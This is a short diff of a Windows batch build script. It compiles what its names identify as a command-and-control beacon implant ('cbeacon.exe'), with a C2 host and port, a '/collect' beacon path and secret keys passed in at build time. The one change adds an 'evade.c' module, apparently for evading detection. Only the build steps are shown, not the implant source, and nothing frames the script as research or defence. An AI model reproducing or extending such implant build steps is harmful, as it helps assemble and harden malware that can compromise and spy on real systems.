@@ -17,5 +17,5 @@ if not "%3"=="" set SID=%3
 if not "%4"=="" set SKEY=%4
 call build-common.cmd check
 if errorlevel 1 exit /b 1
-x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon.exe beacon.c crypto_cng.c curve25519.c sqlite3.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -lgdiplus -lgdi32 -luser32 -lole32 -DC2_HOST=\"%HOST%\" -DC2_PORT=%PORT% -DBEACON_PATH=\"/collect\" -DSECRET_ID=\"%SID%\" -DSECRET_B64=\"%SKEY%\"
+x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon.exe beacon.c crypto_cng.c curve25519.c sqlite3.c evade.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -lgdiplus -lgdi32 -luser32 -lole32 -DC2_HOST=\"%HOST%\" -DC2_PORT=%PORT% -DBEACON_PATH=\"/collect\" -DSECRET_ID=\"%SID%\" -DSECRET_B64=\"%SKEY%\"
 if %ERRORLEVEL%==0 ( echo built cbeacon.exe & dir cbeacon.exe ) else ( echo BUILD FAILED & exit /b 1 )
